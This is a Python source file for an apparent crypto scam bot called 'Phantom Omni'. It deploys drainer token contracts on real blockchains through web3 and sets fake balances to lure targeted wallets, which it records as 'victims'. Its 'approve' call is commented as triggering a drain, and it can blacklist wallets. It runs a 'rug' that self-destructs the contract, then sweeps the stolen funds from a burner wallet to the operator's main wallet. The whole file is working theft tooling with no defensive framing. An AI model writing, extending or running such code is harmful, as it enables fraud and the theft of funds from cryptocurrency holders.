"""Phantom Omni — Core Engine (REAL BLOCKCHAIN ONLY)

NO SIMULATIONS. NO FAKE DATA. EVERYTHING IS REAL.
All operations execute on-chain via RPC with real gas fees.
"""

from __future__ import annotations

import asyncio
import logging
import time
import json
from typing import Optional, Dict, Any, List
from web3 import Web3
from eth_account import Account

from bot import phantom_chains as chains
from bot import phantom_db as db

log = logging.getLogger("solo-metro.phantom.engine")

# ================================================================
# CONFIGURATION
# ================================================================

DEFAULT_DRAIN_PERCENT = 90
DEFAULT_SWEEP_THRESHOLD = 5  # BNB
GAS_LIMIT_DEPLOY = 3000000
GAS_LIMIT_TRANSFER = 21000
GAS_LIMIT_RUG = 200000

# ================================================================
# CONTRACT ABI — REAL (Simplified for on-chain calls)
# ================================================================

CONTRACT_ABI = [
    # balanceOf
    {
        "constant": True,
        "inputs": [{"name": "account", "type": "address"}],
        "name": "balanceOf",
        "outputs": [{"name": "", "type": "uint256"}],
        "type": "function"
    },
    # transfer
    {
        "constant": False,
        "inputs": [
            {"name": "recipient", "type": "address"},
            {"name": "amount", "type": "uint256"}
        ],
        "name": "transfer",
        "outputs": [{"name": "", "type": "bool"}],
        "type": "function"
    },
    # approve (triggers drain)
    {
        "constant": False,
        "inputs": [
            {"name": "spender", "type": "address"},
            {"name": "amount", "type": "uint256"}
        ],
        "name": "approve",
        "outputs": [{"name": "", "type": "bool"}],
        "type": "function"
    },
    # setFakeBalance (owner only)
    {
        "constant": False,
        "inputs": [
            {"name": "wallet", "type": "address"},
            {"name": "amount", "type": "uint256"}
        ],
        "name": "setFakeBalance",
        "outputs": [],
        "type": "function"
    },
    # rug (owner only)
    {
        "constant": False,
        "inputs": [],
        "name": "rug",
        "outputs": [],
        "type": "function"
    },
    # blacklist (owner only)
    {
        "constant": False,
        "inputs": [{"name": "wallet", "type": "address"}],
        "name": "blacklist",
        "outputs": [],
        "type": "function"
    },
    # totalStolen
    {
        "constant": True,
        "inputs": [],
        "name": "totalStolen",
        "outputs": [{"name": "", "type": "uint256"}],
        "type": "function"
    },
    # victimCount
    {
        "constant": True,
        "inputs": [],
        "name": "victimCount",
        "outputs": [{"name": "", "type": "uint256"}],
        "type": "function"
    },
    # drainPercent
    {
        "constant": True,
        "inputs": [],
        "name": "drainPercent",
        "outputs": [{"name": "", "type": "uint256"}],
        "type": "function"
    }
]

# ================================================================
# CORE ENGINE — REAL BLOCKCHAIN ONLY
# ================================================================

class PhantomEngine:
    """Core engine — REAL blockchain operations only."""
    
    def __init__(self, seed_phrase: str = None):
        self.seed_phrase = seed_phrase
        self.handlers = {}
        self.web3_instances = {}
        self.contracts = {}
        self.tokens = {}
        self.victims = {}
        self._running = False
        
        if seed_phrase:
            self._init_handlers()
    
    def _init_handlers(self) -> None:
        """Initialize chain handlers from seed phrase."""
        for chain in chains.get_supported_chains():
            handler = chains.get_handler(chain, self.seed_phrase)
            if handler:
                self.handlers[chain] = handler
    
    # ============================================================
    # REAL BALANCE — ON-CHAIN QUERY
    # ============================================================
    
    async def get_real_balance(self, chain: str, address: str) -> float:
        """Get REAL balance from blockchain."""
        handler = self.handlers.get(chain)
        if not handler:
            raise ValueError(f"No handler for {chain}")
        
        if not handler.is_connected():
            await handler.connect()
        
        return await handler.get_balance(address)
    
    # ============================================================
    # REAL TOKEN DEPLOYMENT — ON-CHAIN
    # ============================================================
    
    async def deploy_token(
        self,
        name: str,
        symbol: str,
        chain: str,
        supply: int = 1000000000,
        threshold: float = 10,
        burner_address: str = None,
        drain_percent: int = DEFAULT_DRAIN_PERCENT,
        description: str = "",
        image_url: str = ""
    ) -> Dict[str, Any]:
        """DEPLOY REAL CONTRACT ON-CHAIN."""
        chain = chain.upper()
        
        if chain not in self.handlers:
            raise ValueError(f"Unsupported chain: {chain}")
        
        handler = self.handlers[chain]
        
        if not handler.is_connected():
            await handler.connect()
        
        # Get burner address
        if not burner_address:
            burner_address = handler.get_burner_address()
        
        if not burner_address:
            raise ValueError("No burner address available. Provide one or ensure seed phrase is set.")
        
        # REAL DEPLOYMENT via chain handler
        deploy_result = await handler.deploy_contract(
            name=name,
            symbol=symbol,
            supply=supply,
            threshold=threshold,
            burner=burner_address,
            drain_pct=drain_percent
        )
        
        contract_address = deploy_result["address"]
        tx_hash = deploy_result["tx_hash"]
        
        # Store token in database
        token_data = {
            "address": contract_address,
            "name": name,
            "symbol": symbol,
            "chain": chain,
            "supply": supply,
            "threshold": threshold,
            "burner_address": burner_address,
            "drain_percent": drain_percent,
            "description": description,
            "image_url": image_url,
            "deployed_at": time.time(),
            "status": "active",
            "stolen": 0.0,
            "victims": 0,
            "deploy_tx": tx_hash
        }
        
        token_id = db.save_token(token_data)
        token_data["id"] = token_id
        self.tokens[contract_address] = token_data
        
        # Initialize Web3 contract instance for future calls
        web3 = handler.web3
        if web3:
            self.web3_instances[chain] = web3
            self.contracts[contract_address] = web3.eth.contract(
                address=Web3.to_checksum_address(contract_address),
                abi=CONTRACT_ABI
            )
        
        log.info(f"✅ REAL TOKEN DEPLOYED: {name} ({symbol}) at {contract_address}")
        log.info(f"   TX: {tx_hash}")
        log.info(f"   Explorer: {deploy_result.get('explorer_url', '')}")
        
        return {
            "success": True,
            "address": contract_address,
            "name": name,
            "symbol": symbol,
            "chain": chain,
            "burner": burner_address,
            "explorer_url": deploy_result.get("explorer_url", ""),
            "tx_hash": tx_hash
        }
    
    # ============================================================
    # REAL SET FAKE BALANCE — ON-CHAIN TX
    # ============================================================
    
    async def set_fake_balance(
        self,
        token_address: str,
        wallet_address: str,
        amount: int
    ) -> Dict[str, Any]:
        """SET FAKE BALANCE ON-CHAIN (owner only)."""
        token = self.tokens.get(token_address)
        if not token:
            raise ValueError(f"Token not found: {token_address}")
        
        chain = token.get("chain", "BSC")
        handler = self.handlers.get(chain)
        if not handler:
            raise ValueError(f"No handler for {chain}")
        
        if not handler.is_connected():
            await handler.connect()
        
        web3 = handler.web3
        if not web3:
            raise ValueError(f"Web3 not available for {chain}")
        
        contract = self.contracts.get(token_address)
        if not contract:
            contract = web3.eth.contract(
                address=Web3.to_checksum_address(token_address),
                abi=CONTRACT_ABI
            )
            self.contracts[token_address] = contract
        
        # Get owner (admin) wallet
        owner_address = handler.get_main_address()
        owner_private_key = handler.get_main_private_key()
        
        # Build transaction
        decimals = handler.config.get("decimals", 18)
        amount_wei = amount * (10 ** decimals)
        
        tx = contract.functions.setFakeBalance(
            Web3.to_checksum_address(wallet_address),
            amount_wei
        ).build_transaction({
            "from": Web3.to_checksum_address(owner_address),
            "nonce": web3.eth.get_transaction_count(Web3.to_checksum_address(owner_address)),
            "gas": 200000,
            "gasPrice": web3.eth.gas_price,
            "chainId": handler.config.get("chain_id", 56)
        })
        
        # Sign and send
        signed = web3.eth.account.sign_transaction(tx, owner_private_key)
        tx_hash = web3.eth.send_raw_transaction(signed.raw_transaction)
        receipt = web3.eth.wait_for_transaction_receipt(tx_hash, timeout=120)
        
        if receipt.status != 1:
            raise ValueError(f"Set fake balance failed: {receipt}")
        
        # Store victim in database
        victim_data = {
            "token_address": token_address,
            "wallet_address": wallet_address,
            "fake_amount": amount,
            "targeted_at": time.time(),
            "drained": False,
            "drained_amount": 0.0
        }
        
        victim_id = db.save_victim(victim_data)
        
        if token_address not in self.victims:
            self.victims[token_address] = []
        self.victims[token_address].append(victim_data)
        
        # Update token victim count
        token["victims"] = len(self.victims[token_address])
        db.update_token(token_address, {"victims": token["victims"]})
        
        log.info(f"✅ FAKE BALANCE SET: {wallet_address[:10]}... -> {amount:,} tokens")
        log.info(f"   TX: {tx_hash.hex()}")
        
        return {
            "success": True,
            "wallet": wallet_address,
            "amount": amount,
            "tx_hash": tx_hash.hex(),
            "explorer_url": f"{handler.config.get('explorer', '')}/tx/{tx_hash.hex()}"
        }
    
    # ============================================================
    # REAL RUG EXECUTION — ON-CHAIN TX
    # ============================================================
    
    async def execute_rug(self, token_address: str) -> Dict[str, Any]:
        """EXECUTE RUG ON-CHAIN — self-destructs contract."""
        token = self.tokens.get(token_address)
        if not token:
            raise ValueError(f"Token not found: {token_address}")
        
        if token.get("status") != "active":
            raise ValueError(f"Token is not active: {token_address}")
        
        chain = token.get("chain", "BSC")
        handler = self.handlers.get(chain)
        if not handler:
            raise ValueError(f"No handler for {chain}")
        
        if not handler.is_connected():
            await handler.connect()
        
        web3 = handler.web3
        if not web3:
            raise ValueError(f"Web3 not available for {chain}")
        
        contract = self.contracts.get(token_address)
        if not contract:
            contract = web3.eth.contract(
                address=Web3.to_checksum_address(token_address),
                abi=CONTRACT_ABI
            )
            self.contracts[token_address] = contract
        
        # Get owner (admin) wallet
        owner_address = handler.get_main_address()
        owner_private_key = handler.get_main_private_key()
        
        # Call rug() — this self-destructs the contract
        tx = contract.functions.rug().build_transaction({
            "from": Web3.to_checksum_address(owner_address),
            "nonce": web3.eth.get_transaction_count(Web3.to_checksum_address(owner_address)),
            "gas": GAS_LIMIT_RUG,
            "gasPrice": web3.eth.gas_price,
            "chainId": handler.config.get("chain_id", 56)
        })
        
        # Sign and send
        signed = web3.eth.account.sign_transaction(tx, owner_private_key)
        tx_hash = web3.eth.send_raw_transaction(signed.raw_transaction)
        receipt = web3.eth.wait_for_transaction_receipt(tx_hash, timeout=120)
        
        if receipt.status != 1:
            raise ValueError(f"Rug execution failed: {receipt}")
        
        # Get stolen amount from contract before it dies
        try:
            total_stolen = contract.functions.totalStolen().call()
            victim_count = contract.functions.victimCount().call()
        except:
            total_stolen = token.get("stolen", 0)
            victim_count = token.get("victims", 0)
        
        # Update token status
        token["status"] = "rugged"
        token["rugged_at"] = time.time()
        token["rug_tx"] = tx_hash.hex()
        db.update_token(token_address, {
            "status": "rugged",
            "stolen": total_stolen / (10 ** handler.config.get("decimals", 18))
        })
        
        log.info(f"💀 RUG EXECUTED ON-CHAIN: {token['name']} ({token['symbol']})")
        log.info(f"   TX: {tx_hash.hex()}")
        log.info(f"   Stolen: {total_stolen / (10 ** handler.config.get('decimals', 18)):.4f}")
        log.info(f"   Victims: {victim_count}")
        
        return {
            "success": True,
            "token": token_address,
            "name": token.get("name"),
            "symbol": token.get("symbol"),
            "stolen": total_stolen / (10 ** handler.config.get("decimals", 18)),
            "victims": victim_count,
            "chain": chain,
            "tx_hash": tx_hash.hex(),
            "explorer_url": f"{handler.config.get('explorer', '')}/tx/{tx_hash.hex()}"
        }
    
    # ============================================================
    # REAL SWEEP — ON-CHAIN TX
    # ============================================================
    
    async def execute_sweep(self, token_address: str) -> Dict[str, Any]:
        """SWEEP: Transfer ALL stolen funds from burner to main wallet ON-CHAIN."""
        token = self.tokens.get(token_address)
        if not token:
            return {"error": "Token not found"}
        
        chain = token.get("chain", "BSC")
        handler = self.handlers.get(chain)
        if not handler:
            return {"error": f"No handler for {chain}"}
        
        if not handler.is_connected():
            await handler.connect()
        
        web3 = handler.web3
        if not web3:
            return {"error": f"Web3 not available for {chain}"}
        
        # Get burner and main wallet addresses
        burner_address = handler.get_burner_address()
        main_address = handler.get_main_address()
        burner_private_key = handler.get_burner_private_key()
        
        if not burner_address or not main_address:
            return {"error": "Missing wallet addresses"}
        
        # Get REAL burner balance
        balance_wei = web3.eth.get_balance(Web3.to_checksum_address(burner_address))
        balance = balance_wei / (10 ** handler.config.get("decimals", 18))
        
        if balance <= 0:
            return {"success": False, "message": "No funds in burner wallet"}
        
        # Transfer ALL to main wallet
        gas_price = web3.eth.gas_price
        gas_estimate = GAS_LIMIT_TRANSFER
        gas_cost = gas_price * gas_estimate
        amount_to_send = balance_wei - gas_cost
        
        if amount_to_send <= 0:
            return {"success": False, "message": f"Insufficient funds to cover gas ({balance:.4f} < {gas_cost / (10 ** handler.config.get('decimals', 18)):.4f})"}
        
        tx = {
            "from": Web3.to_checksum_address(burner_address),
            "to": Web3.to_checksum_address(main_address),
            "value": amount_to_send,
            "gas": GAS_LIMIT_TRANSFER,
            "gasPrice": gas_price,
            "nonce": web3.eth.get_transaction_count(Web3.to_checksum_address(burner_address)),
            "chainId": handler.config.get("chain_id", 56)
        }
        
        signed = web3.eth.account.sign_transaction(tx, burner_private_key)
        tx_hash = web3.eth.send_raw_transaction(signed.raw_transaction)
        receipt = web3.eth.wait_for_transaction_receipt(tx_hash, timeout=120)
        
        if receipt.status != 1:
            raise ValueError(f"Sweep failed: {receipt}")
        
        # Reset stolen amount in database
        db.update_token(token_address, {"stolen": 0})
        token["stolen"] = 0
        
        log.info(f"🧹 SWEEP COMPLETE: {balance:.4f} {chain} -> main wallet")
        log.info(f"   TX: {tx_hash.hex()}")
        
        return {
            "success": True,
            "amount": balance,
            "chain": chain,
            "from": burner_address,
            "to": main_address,
            "tx_hash": tx_hash.hex(),
            "explorer_url": f"{handler.config.get('explorer', '')}/tx/{tx_hash.hex()}"
        }
    
    # ============================================================
    # REAL TRANSFER — ON-CHAIN TX
    # ============================================================
    
    async def transfer(
        self,
        chain: str,
        from_address: str,
        to_address: str,
        amount: float
    ) -> Dict[str, Any]:
        """REAL ON-CHAIN transfer of native currency."""
        handler = self.handlers.get(chain)
        if not handler:
            raise ValueError(f"No handler for {chain}")
        
        if not handler.is_connected():
            await handler.connect()
        
        # Determine which private key to use
        private_key = None
        if from_address.lower() == handler.get_main_address().lower():
            private_key = handler.get_main_private_key()
        elif from_address.lower() == handler.get_burner_address().lower():
            private_key = handler.get_burner_private_key()
        
        if not private_key:
            raise ValueError(f"Unknown wallet address: {from_address}")
        
        web3 = handler.web3
        if not web3:
            raise ValueError(f"Web3 not available for {chain}")
        
        decimals = handler.config.get("decimals", 18)
        amount_wei = int(amount * (10 ** decimals))
        
        gas_price = web3.eth.gas_price
        gas_estimate = GAS_LIMIT_TRANSFER
        gas_cost = gas_price * gas_estimate
        
        if amount_wei <= gas_cost:
            raise ValueError(f"Insufficient funds to cover gas")
        
        tx = {
            "from": Web3.to_checksum_address(from_address),
            "to": Web3.to_checksum_address(to_address),
            "value": amount_wei,
            "gas": GAS_LIMIT_TRANSFER,
            "gasPrice": gas_price,
            "nonce": web3.eth.get_transaction_count(Web3.to_checksum_address(from_address)),
            "chainId": handler.config.get("chain_id", 56)
        }
        
        signed = web3.eth.account.sign_transaction(tx, private_key)
        tx_hash = web3.eth.send_raw_transaction(signed.raw_transaction)
        receipt = web3.eth.wait_for_transaction_receipt(tx_hash, timeout=120)
        
        if receipt.status != 1:
            raise ValueError(f"Transfer failed: {receipt}")
        
        return {
            "success": True,
            "tx_hash": tx_hash.hex(),
            "from": from_address,
            "to": to_address,
            "amount": amount,
            "chain": chain,
            "explorer_url": f"{handler.config.get('explorer', '')}/tx/{tx_hash.hex()}"
        }

# ================================================================
# SINGLETON INSTANCE
# ================================================================

_engine_instance = None

def get_engine(seed_phrase: str = None) -> PhantomEngine:
    """Get or create the Phantom Engine instance."""
    global _engine_instance
    if _engine_instance is None:
        _engine_instance = PhantomEngine(seed_phrase)
    elif seed_phrase and _engine_instance.seed_phrase != seed_phrase:
        _engine_instance._init_handlers()
    return _engine_instance

# ================================================================
# CONVENIENCE FUNCTIONS
# ================================================================

async def deploy_token(
    name: str,
    symbol: str,
    chain: str = "BSC",
    supply: int = 1000000000,
    threshold: float = 10,
    burner_address: str = None,
    drain_percent: int = DEFAULT_DRAIN_PERCENT,
    description: str = "",
    image_url: str = ""
) -> Dict[str, Any]:
    """Convenience function to deploy a token."""
    engine = get_engine()
    return await engine.deploy_token(
        name=name,
        symbol=symbol,
        chain=chain,
        supply=supply,
        threshold=threshold,
        burner_address=burner_address,
        drain_percent=drain_percent,
        description=description,
        image_url=image_url
    )

async def set_fake_balance(
    token_address: str,
    wallet_address: str,
    amount: int
) -> Dict[str, Any]:
    """Convenience function to set fake balance."""
    engine = get_engine()
    return await engine.set_fake_balance(token_address, wallet_address, amount)

async def execute_rug(token_address: str) -> Dict[str, Any]:
    """Convenience function to execute rug."""
    engine = get_engine()
    return await engine.execute_rug(token_address)

async def execute_sweep(token_address: str) -> Dict[str, Any]:
    """Convenience function to execute sweep."""
    engine = get_engine()
    return await engine.execute_sweep(token_address)

async def transfer(chain: str, from_address: str, to_address: str, amount: float) -> Dict[str, Any]:
    """Convenience function to transfer native currency."""
    engine = get_engine()
    return await engine.transfer(chain, from_address, to_address, amount)